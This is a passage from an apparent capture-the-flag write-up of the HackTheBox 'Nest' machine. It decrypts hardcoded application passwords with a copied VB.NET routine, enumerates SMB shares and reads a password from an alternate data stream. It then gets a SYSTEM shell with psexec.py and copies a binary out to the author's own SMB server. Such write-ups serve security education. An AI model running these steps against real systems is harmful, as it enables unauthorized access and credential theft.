[![](https://0xdfimages.gitlab.io/img/image-20200605154439537.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200605154439537.png)

Now I’ll hit Start. It runs to the break point and stops. In the bottom window, I can see all the variables in memory:

[![](https://0xdfimages.gitlab.io/img/image-20200605154533536.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200605154533536.png)

I’ll hit Step Over once, and it moves past the current line. Now the decrypted password is there:

[![](https://0xdfimages.gitlab.io/img/image-20200605154620287.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200605154620287.png)

The other way to quickly get the password is to add a line to `Main()`:

```

Module Module1

    Sub Main()
        Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
        Console.WriteLine(Utils.DecryptString(Config.Password))

    End Sub

End Module

```

I could also comment out the other two. Or put a static string in instead of `Config.Password`. Now I’ll build again, and run:

```

PS > .\DbPof.exe
xRxRxPANCAK3SxRxRx

```

#### Web IDE Path

The quick way to recover the password is to put this code into an online VB environment like [dotnetfiddle](https://dotnetfiddle.net/). When I first visit and select VB.NET as the language, it gives some Hello World code:

```

Imports System
				
Public Module Module1
	Public Sub Main()
		Console.WriteLine("Hello World")
	End Sub
End Module

```

I can run it, and it prints “Hello World” in the console at the bottom:

![image-20200605150337111](https://0xdfimages.gitlab.io/img/image-20200605150337111.png)

I’ll jam my own code in here. I’ll replace `"Hello World"` with `DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")`. Now I’ll add the `DecryptString` and `Decrypt` functions with very little modification. I needed to remove the keyword “Shared” from the function declarations:

![image-20200605150818789](https://0xdfimages.gitlab.io/img/image-20200605150818789.png)

My resulting code is:

```

Imports System
Imports System.Text
Imports System.Security.Cryptography

Public Module Module1
  Public Sub Main()
    Console.WriteLine(DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="))
  End Sub

  Public Function DecryptString(EncryptedString As String) As String
    If String.IsNullOrEmpty(EncryptedString) Then
      Return String.Empty
    Else
      Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
    End If
  End Function

  Public Function Decrypt(ByVal cipherText As String, _
                          ByVal passPhrase As String, _
                          ByVal saltValue As String, _
                          ByVal passwordIterations As Integer, _
                          ByVal initVector As String, _
                          ByVal keySize As Integer) _
                          As String

    Dim initVectorBytes As Byte()
    initVectorBytes = Encoding.ASCII.GetBytes(initVector)

    Dim saltValueBytes As Byte()
    saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

    Dim cipherTextBytes As Byte()
    cipherTextBytes = Convert.FromBase64String(cipherText)

    Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                       saltValueBytes, _
                                       passwordIterations)

    Dim keyBytes As Byte()
    keyBytes = password.GetBytes(CInt(keySize / 8))

    Dim symmetricKey As New AesCryptoServiceProvider
    symmetricKey.Mode = CipherMode.CBC

    Dim decryptor As ICryptoTransform
    decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

    Dim memoryStream As IO.MemoryStream
    memoryStream = New IO.MemoryStream(cipherTextBytes)

    Dim cryptoStream As CryptoStream
    cryptoStream = New CryptoStream(memoryStream, _
                                    decryptor, _
                                    CryptoStreamMode.Read)

    Dim plainTextBytes As Byte()
    ReDim plainTextBytes(cipherTextBytes.Length)

    Dim decryptedByteCount As Integer
    decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                           0, _
                                           plainTextBytes.Length)

    memoryStream.Close()
    cryptoStream.Close()

    Dim plainText As String
    plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                        0, _
                                        decryptedByteCount)

    Return plainText
  End Function

End Module

```

When it runs, it prints: `xRxRxPANCAK3SxRxRx`.

### SMB Access

The password does work for SMB for C.Smith, but doesn’t give admin or code exec (no `(Pwn3d!)` message):

```

root@kali# crackmapexec smb 10.10.10.178 -u C.Smith -p xRxRxPANCAK3SxRxRx
SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\C.Smith:xRxRxPANCAK3SxRxRx 

```

C.Smith has access to the same three shares:

```

root@kali# smbmap -H 10.10.10.178 -u C.Smith -p xRxRxPANCAK3SxRxRx
[+] IP: 10.10.10.178:445        Name: 10.10.10.178                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 READ ONLY
        Users                                                   READ ONLY

```

I can now access the `C.Smith` directory in `\\10.10.10.178\Users`, and there’s `user.txt`:

```

root@kali# smbclient -U C.Smith //10.10.10.178/users xRxRxPANCAK3SxRxRx
Try "help" to get a list of possible commands.
smb: \C.Smith\> dir
  .                                   D        0  Sun Jan 26 02:21:44 2020
  ..                                  D        0  Sun Jan 26 02:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 19:06:17 2019
  user.txt                            A       32  Thu Aug  8 19:05:24 2019

```

I’ll get `user.txt`, and then back on my box I can print the flag:

```

root@kali# cat user.txt
cf71b254************************

```

## Shell as SYSTEM

### Enumeration

Also in C.Smith’s directory in the share is the `HQK Reporting` folder. That matches the service I identified on port 4386 in initial recon. I’ll recurrsively pull back all the files, and there are three:

```

root@kali# find HQK\ Reporting/ -type f -ls
     6603      0 -rwxrwx---   1 root     vboxsf          0 Jun  5 15:52 HQK\ Reporting/Debug\ Mode\ Password.txt
     6604      4 -rwxrwx---   1 root     vboxsf        249 Jun  5 15:52 HQK\ Reporting/HQK_Config_Backup.xml
     6602     20 -rwxrwx---   1 root     vboxsf      17408 Jun  5 15:52 HQK\ Reporting/AD\ Integration\ Module/HqkLdap.exe

```

The backup config confirms the port and the directory that the user starts in once they connect:

```

<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>

```

I’m particularly drawn to `Debug Mode Password.txt`, except that it came back as zero bytes. Interestingly, it reports to be zero bytes on the share as well:

```

smb: \C.Smith\> cd "HQK Reporting"
smb: \C.Smith\HQK Reporting\> dir
  .                                   D        0  Thu Aug  8 19:06:17 2019
  ..                                  D        0  Thu Aug  8 19:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019

                10485247 blocks of size 4096. 6545781 blocks available

```

However, if I run `allinfo` on it, I can see something else:

```

smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes

```

There’s an alternative data stream (ADS) there. I’ve run into these on HTB before. In both [Hackback](/2019/07/06/htb-hackback.html#roottxt) and [Dropzone](/2018/11/03/htb-dropzone.html#alternative-data-streams) the root flag was in an ADS. In [Bighead](/2019/05/04/htb-bighead.html#roottxt) it was the Keepass database. I can get it with `smbclient` just by specifying the entire stream name with a `get`:

```

smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password"
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

```

Locally, I can get the password:

```

root@kali# cat Debug\ Mode\ Password.txt\:Password 
WBQ201953D8w 

```

### Revisiting HQK Reporting

I’ll connect again to HQK (using `rlwrap` to get arrow keys), and enter the debug creds. They work, and new commands are unlocked:

```

root@kali# rlwrap telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

> debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
> help

This service allows users to run queries against databases using the legacy HQK format
--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>

```

`RUNQUERY` still does nothing, but the new command `SHOWQUERY` seems to print the content of the file:

```

>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
>runquery 1

Invalid database configuration found. Please contact your system administrator

>showquery 1

TITLE=Invoices (Ordered By Customer)
QUERY_MODE=VIEW
QUERY_TYPE=INVOICE
SORTBY=CUSTOMER
DATERANGE=ALL

```

One directory up, there’s the executable and some config files for the program:

```

>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK

```

`HQK_Config.xml` is the same as I pulled off SMB. In the `LDAP` directory, there’s a config file and another executable:

```

>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: ldap

```

The `.conf` file looks like another example with an encrypted password:

```

>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=

```

### HqkLdap.exe

The other file in that directory, and that I pulled from SMB is `HqkLdap.exe`. It’s a 32-bit .NET executable:

```

root@kali# file HqkLdap.exe 
files/C.Smith/HQK Reporting/AD Integration Module/HqkLdap.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows

```

Based on the file names and the directory names, my thinking is that somehow this developer is trying to tie this application that doesn’t quite work yet into Active Directory, and may need (or at least be using) the administrator password to do that.

I’ll head back to my Windows VM, open dnSpy-x86 and load `HqkLdap.exe`. Just like last time, I’ll find `Main()`:

[![](https://0xdfimages.gitlab.io/img/image-20200605170732501.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200605170732501.png)

The source starts off as:

```

public static void Main()
{
  checked
  { 
    try
    {
      if (MyProject.Application.CommandLineArgs.Count != 1) 
      {
        Console.WriteLine("Invalid number of command line arguments");
      }
      else if (!File.Exists(MyProject.Application.CommandLineArgs[0]))
      {
        Console.WriteLine("Specified config file does not exist");
      }
      else if (!File.Exists("HqkDbImport.exe"))
      {
        Console.WriteLine("Please ensure the optional database import module is installed");
      }

```

First, there are three conditions that are required to run:
- There’s one command line argument.
- The config file specified as the command line argument exists.
- `HqkDbImport.exe` exists.

This last one could be challenging, but it is called after the part of the code I care about, so it’s not important. I’ll create the two files in the same directory:

![image-20200605171557819](https://0xdfimages.gitlab.io/img/image-20200605171557819.png)

After those checks, it loads the config file:

```

      else
      {
        LdapSearchSettings ldapSearchSettings = new LdapSearchSettings();
        string[] array = File.ReadAllLines(MyProject.Application.CommandLineArgs[0]);
        foreach (string text in array)
        {
          if (text.StartsWith("Domain=", StringComparison.CurrentCultureIgnoreCase))
          {
            ldapSearchSettings.Domain = text.Substring(text.IndexOf('=') + 1);
          }
          else if (text.StartsWith("User=", StringComparison.CurrentCultureIgnoreCase))
          {
            ldapSearchSettings.Username = text.Substring(text.IndexOf('=') + 1);
          }
          else if (text.StartsWith("Password=", StringComparison.CurrentCultureIgnoreCase))
          {
            ldapSearchSettings.Password = CR.DS(text.Substring(text.IndexOf('=') + 1));
          }
        }

```

I’ll put a break point on the next line after the password is decrypted and set. I’ll select Debug -> Start Debugging…, and add `ldap.conf` as an argument:

![image-20200605171635589](https://0xdfimages.gitlab.io/img/image-20200605171635589.png)

On hitting OK, it runs to my break point, and I can see the decrypted password:

[![](https://0xdfimages.gitlab.io/img/image-20200605171717068.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200605171717068.png)

Password: XtH4nkS4Pl4y1nGX

### PSExec

With the administrator password, I can now PSExec to get a shell as SYSTEM:

```

root@kali# rlwrap psexec.py administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
Impacket v0.9.22.dev1+20200422.223359.23bbfbe1 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.178.....
[*] Found writable share ADMIN$
[*] Uploading file OYlCNyku.exe
[*] Opening SVCManager on 10.10.10.178.....
[*] Creating service zpAT on 10.10.10.178.....
[*] Starting service zpAT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

And I can get the root flag:

```

C:\Users\Administrator\Desktop>type root.txt
6594c2eb************************

```

## Beyond Root

As far as I knew, both `telnet` and `nc` transmit only what is input, with no protocol or any other wrapping around it. So why, when [enumerating port 4386](#hqk---tcp-4386), did one work, and the other not?

I opened up Wireshark, started a capture, and for each connected, typed `help` at the first prompt, and hit Enter. On first look, they looked exactly the same.

`nc`:

![image-20200605201227701](https://0xdfimages.gitlab.io/img/image-20200605201227701.png)

`telnet`:

![image-20200605201245413](https://0xdfimages.gitlab.io/img/image-20200605201245413.png)

When I looked at them as Hex, the answer immediately became clear:

`nc`:

![image-20200605201357255](https://0xdfimages.gitlab.io/img/image-20200605201357255.png)

`telnet`:

![image-20200605201412359](https://0xdfimages.gitlab.io/img/image-20200605201412359.png)

`nc` was sending a Linux newline, `\n` or 0x0a, when I hit Enter. `telnet` sends a Windows new line, `\r\n` or 0x0d 0x0a. Most applications I typically deal with are fine with the `\n`, but this application is not.

I used my shell to grab a copy of `HqkSvc.exe` over SMB (first started the server with `smbserver.py s . -username df -password df -smb2support`):

```

C:\PROGRA~1\HQK>net use \\10.10.14.24\s /u:df df
The command completed successfully.
C:\PROGRA~1\HQK>copy HqkSvc.exe \\10.10.14.24\s\
        1 file(s) copied.

```

Opening it in dnSpy, it wasn’t quite as simple, but eventually I found the function, `DataReceived`:

![image-20200605202225518](https://0xdfimages.gitlab.io/img/image-20200605202225518.png)

The code for this function:

```

private void DataReceived(IAsyncResult Result)
{
  try
  {
    if (!this._ShuttingDown)
	{
      int num = 0;
      bool flag = false;
      try
      {
        if (!this.TcpIpClient.Connected)
		{
          flag = true;
		}
		num = this._Stream.EndRead(Result);
		if (num == 0)
		{
          flag = true;
		}
      }
      catch (Exception ex)
      {
		flag = true;
      }
      if (flag)
      {
        this.Close();
      }
      else
      {
		string @string = Encoding.ASCII.GetString(this._CurrentBuffer, 0, num);
		if (!string.IsNullOrEmpty(@string))
        {
          if (Operators.CompareString(@string, "\t", false) != 0)
          {
            if (Operators.CompareString(@string, "\b", false) == 0 || Strings.Asc(@string[0]) == 127)
			{
              if (this._CurrentInput.Length > 0)
              {
				this._CurrentInput.Remove(checked(this._CurrentInput.Length - 1), 1);
				this._Writer.Write(" \b");
              }
			}
			else
			{
              this._CurrentInput.Append(@string);
              if (this._CurrentInput.Length > 2048)
              {
				this._CurrentInput.Clear();
				this.WriteLineToClient("Data received is over max size limit");
				this.Close();
				return;
              }
              if (@string.EndsWith("\r\n") || @string.EndsWith("\r"))
              {
				string fullCommandReceived = this._CurrentInput.ToString();
				this._CurrentInput.Clear();
				this.ProcessCommand(fullCommandReceived);
              }
			}
          }
		}
		this.WaitForData(false);
      }
	}
  }
  catch (Exception ex2)
  {
	this.Close();
  }
}

```

The part that I’m looking for is towards the end. It is waiting for a string that ends with `\r\n` or `\r`, and then it runs `this.ProcessCommand(fullCommandReveived)`. So with `nc`, it just never leaves this loop.

[Digging into PSExec »](/2020/01/26/digging-into-psexec-with-htb-nest.html)